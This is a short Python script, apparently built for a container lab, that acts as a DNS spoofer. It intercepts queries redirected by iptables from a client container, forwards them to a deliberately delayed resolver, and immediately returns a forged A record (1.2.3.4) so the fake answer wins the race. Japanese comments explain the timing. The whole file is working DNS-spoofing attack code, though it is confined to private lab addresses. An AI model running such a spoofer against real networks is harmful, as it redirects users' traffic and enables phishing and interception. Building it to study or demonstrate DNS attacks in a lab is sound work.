import socket
import threading
from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE

def handle_client(data, addr, sock_bc):
    try:
        request = DNSRecord.parse(data)
        qname = str(request.q.qname)
        print(f"[Container B] Intercepted DNS query for '{qname}' from Container C ({addr})", flush=True)

        # バックグラウンドでA(172.20.0.10)へ転送してAを10秒遅延処理に入らせる
        def forward_to_a():
            sock_a = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # 10秒後に帰ってくるAからのパケットを受け止めてCに渡すため10秒プラスアルファ待っている。
            sock_a.settimeout(12)
            try:
                # iptablesのループを避けるため、直接172.20.0.10:53へ送信
                sock_a.sendto(data, ('172.20.0.10', 53))
                a_data, _ = sock_a.recvfrom(1024)
                print("[Container B] Received 10s delayed response from Container A (Discarded)", flush=True)
            except Exception as e:
                print(f"[Container B] Forward to A notice: {e}", flush=True)

        threading.Thread(target=forward_to_a, daemon=True).start()

        # Aが10秒待っている間に、偽装応答 (1.2.3.4) をCへ即座に返却
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=60))
        
        # Cへ返答
        sock_bc.sendto(reply.pack(), addr)
        print(f"[Container B] Spoofed response (1.2.3.4) sent to Container C ({addr}) instantly!", flush=True)
    except Exception as e:
        print(f"[Container B] Error: {e}", flush=True)

def main():
    # iptablesからの転送を受けるため 5353 ポートで待受
    sock_bc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_bc.bind(('0.0.0.0', 5353))
    print("[Container B] Proxy/Spoofer listening on port 5353...", flush=True)

    while True:
        data, addr = sock_bc.recvfrom(1024)
        threading.Thread(target=handle_client, args=(data, addr, sock_bc)).start()

if __name__ == '__main__':
    main()